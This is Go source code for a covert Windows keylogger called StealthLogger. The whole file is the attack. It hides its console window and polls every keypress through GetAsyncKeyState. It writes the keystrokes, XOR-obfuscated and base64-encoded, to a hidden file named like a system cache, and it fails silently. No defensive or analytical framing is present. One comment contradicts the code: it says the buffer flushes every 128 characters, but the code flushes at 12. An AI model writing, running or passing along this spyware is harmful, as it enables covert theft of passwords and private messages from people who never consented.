package main

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

type StealthLogger struct {
	buffer      []byte
	isRunning   bool
	user32      *syscall.LazyDLL
	getAsyncKey *syscall.LazyProc
	logFile     *os.File
	filePath    string
}

func NewStealthLogger() *StealthLogger {
	// Get directory where executable is running
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)

	// Create random filename in same directory
	randBytes := make([]byte, 6)
	rand.Read(randBytes)
	fileName := fmt.Sprintf("cache_%x.bin", randBytes) 
	filePath := filepath.Join(exeDir, fileName)

	return &StealthLogger{
		buffer:      make([]byte, 0, 1024),
		user32:      syscall.NewLazyDLL("user32.dll"),
		getAsyncKey: syscall.NewLazyDLL("user32.dll").NewProc("GetAsyncKeyState"),
		filePath:    filePath,
	}
}

func (s *StealthLogger) Start() error {
	// Open or create log file in same directory
	var err error
	s.logFile, err = os.OpenFile(s.filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}

	// Hide the file (Windows only)
	s.hideFile()

	// Write initial marker to identify file
	s.logFile.WriteString("[SystemCache]\n")

	s.isRunning = true

	// Start monitoring
	go s.monitorLoop()

	return nil
}

func (s *StealthLogger) hideFile() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	setFileAttributes := kernel32.NewProc("SetFileAttributesW")
	pathPtr, _ := syscall.UTF16PtrFromString(s.filePath)
	setFileAttributes.Call(uintptr(unsafe.Pointer(pathPtr)), uintptr(0x2)) // Hidden
}

func (s *StealthLogger) Stop() {
	s.isRunning = false
	if s.logFile != nil {
		// Write any remaining buffer
		if len(s.buffer) > 0 {
			s.flushToFile()
		}
		s.logFile.Close()
		s.logFile = nil
	}
}

func (s *StealthLogger) monitorLoop() {
	ticker := time.NewTicker(80 * time.Millisecond) // Slightly faster
	defer ticker.Stop()

	for s.isRunning {
		<-ticker.C
		s.checkKeys()
	}
}

func (s *StealthLogger) checkKeys() {
	// Check common keys
	keys := []struct {
		vkCode int
		char   byte
	}{
		// Letters (lowercase)
		{0x41, 'a'}, {0x42, 'b'}, {0x43, 'c'}, {0x44, 'd'}, {0x45, 'e'},
		{0x46, 'f'}, {0x47, 'g'}, {0x48, 'h'}, {0x49, 'i'}, {0x4A, 'j'},
		{0x4B, 'k'}, {0x4C, 'l'}, {0x4D, 'm'}, {0x4E, 'n'}, {0x4F, 'o'},
		{0x50, 'p'}, {0x51, 'q'}, {0x52, 'r'}, {0x53, 's'}, {0x54, 't'},
		{0x55, 'u'}, {0x56, 'v'}, {0x57, 'w'}, {0x58, 'x'}, {0x59, 'y'},
		{0x5A, 'z'},
		// Numbers
		{0x30, '0'}, {0x31, '1'}, {0x32, '2'}, {0x33, '3'}, {0x34, '4'},
		{0x35, '5'}, {0x36, '6'}, {0x37, '7'}, {0x38, '8'}, {0x39, '9'},
		// Special
		{0x20, ' '}, {0x0D, '\n'}, {0x08, '\b'}, {0x09, '\t'},
		{0xBC, ','}, {0xBE, '.'}, {0xBF, '/'}, {0xBA, ';'}, {0xBB, '='},
	}

	// Check shift state for uppercase
	shiftPressed := false
	ret, _, _ := s.getAsyncKey.Call(uintptr(0x10)) // VK_SHIFT
	if ret&0x8000 != 0 {
		shiftPressed = true
	}

	for _, key := range keys {
		ret, _, _ := s.getAsyncKey.Call(uintptr(key.vkCode))
		if ret&0x8000 != 0 {
			char := key.char

			// Convert to uppercase if shift pressed
			if shiftPressed && key.char >= 'a' && key.char <= 'z' {
				char = key.char - 32 // Convert to uppercase
			}

			s.buffer = append(s.buffer, char)

			// Flush more frequently (every 128 chars)
			if len(s.buffer) >= 12 {
				s.flushToFile()
			}
			break
		}
	}
}

func (s *StealthLogger) flushToFile() {
	if len(s.buffer) == 0 || s.logFile == nil {
		return
	}

	// Simple encryption (XOR with random pattern)
	for i := range s.buffer {
		s.buffer[i] ^= 0x55
	}

	// Save with timestamp
	timestamp := time.Now().Unix()
	encoded := base64.RawStdEncoding.EncodeToString(s.buffer)
	data := fmt.Sprintf("%d|%s\n", timestamp, encoded)

	s.logFile.WriteString(data)
	s.logFile.Sync()
	s.buffer = s.buffer[:0]
}

func hideConsole() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")

	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, 0) // SW_HIDE
	}
}

func main() {
	// Hide console window
	hideConsole()

	// Create and start logger
	logger := NewStealthLogger()
	defer logger.Stop()

	if err := logger.Start(); err != nil {
		// Silent failure
		return
	}

	// Run indefinitely
	select {}
}
